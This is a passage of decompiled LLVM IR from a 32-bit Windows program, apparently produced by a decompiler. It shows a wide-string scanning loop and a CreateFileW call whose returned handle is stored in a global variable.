  br label %dec_label_pc_100032a5, !insn.addr !1386

dec_label_pc_100032a5:                            ; preds = %dec_label_pc_100032a5, %dec_label_pc_10003266
  %ecx.12.reload = load i32, i32* %ecx.12.reg2mem
  %833 = inttoptr i32 %ecx.12.reload to i16*, !insn.addr !1387
  %834 = load i16, i16* %833, align 2, !insn.addr !1387
  %835 = add i32 %ecx.12.reload, 2, !insn.addr !1388
  %836 = icmp eq i16 %834, 0, !insn.addr !1389
  %837 = icmp eq i1 %836, false, !insn.addr !1390
  store i32 %835, i32* %ecx.12.reg2mem, !insn.addr !1390
  store i32 %835, i32* %.pn.reg2mem, !insn.addr !1390
  store i32 %832, i32* %edx.6.reg2mem, !insn.addr !1390
  store i32 %829, i32* %esp.4.reg2mem, !insn.addr !1390
  br i1 %837, label %dec_label_pc_100032a5, label %dec_label_pc_10003413, !insn.addr !1390

dec_label_pc_100032bb:                            ; preds = %dec_label_pc_10002bc4
  %838 = add i32 %esp.3.reload, -4, !insn.addr !1391
  %839 = inttoptr i32 %838 to i32*, !insn.addr !1391
  store i32 0, i32* %839, align 4, !insn.addr !1391
  %840 = add i32 %esp.3.reload, -8, !insn.addr !1392
  %841 = inttoptr i32 %840 to i32*, !insn.addr !1392
  store i32 128, i32* %841, align 4, !insn.addr !1392
  %842 = add i32 %esp.3.reload, -12, !insn.addr !1393
  %843 = inttoptr i32 %842 to i32*, !insn.addr !1393
  store i32 4, i32* %843, align 4, !insn.addr !1393
  %844 = add i32 %esp.3.reload, -16, !insn.addr !1394
  %845 = inttoptr i32 %844 to i32*, !insn.addr !1394
  store i32 0, i32* %845, align 4, !insn.addr !1394
  %846 = add i32 %esp.3.reload, -20, !insn.addr !1395
  %847 = inttoptr i32 %846 to i32*, !insn.addr !1395
  store i32 1, i32* %847, align 4, !insn.addr !1395
  %848 = add i32 %esp.3.reload, -24, !insn.addr !1396
  %849 = inttoptr i32 %848 to i32*, !insn.addr !1396
  store i32 4, i32* %849, align 4, !insn.addr !1396
  %850 = add i32 %esp.3.reload, -28, !insn.addr !1397
  %851 = inttoptr i32 %850 to i32*, !insn.addr !1397
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %851, align 4, !insn.addr !1397
  store i128 4718683, i128* %stack_var_-108, align 8, !insn.addr !1398
  %852 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1399
  %853 = ptrtoint i32* %852 to i32, !insn.addr !1399
  store i32 %853, i32* @global_var_1003d9c0, align 4, !insn.addr !1400
  store i32 %33, i32* %ecx.13.reg2mem, !insn.addr !1401
